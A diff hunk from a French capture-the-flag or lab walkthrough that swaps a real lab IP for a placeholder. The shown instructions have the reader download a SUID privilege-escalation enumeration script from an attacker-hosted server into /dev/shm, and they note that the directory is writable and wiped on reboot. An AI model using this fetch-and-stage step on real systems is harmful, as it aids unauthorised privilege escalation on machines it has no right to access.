@@ -1957,7 +1957,7 @@ Depuis la session SSH ouverte avec `pepper`, télécharge ensuite le script dans
 
 ```bash
 cd /dev/shm
-wget http://10.10.15.96:8000/suid3num.py
+wget http://10.10.x.x:8000/suid3num.py
 ```
 
 Le répertoire `/dev/shm` convient bien à ce type de fichier temporaire. Il est généralement accessible en écriture par les utilisateurs non privilégiés et son contenu disparaît au redémarrage de la machine.
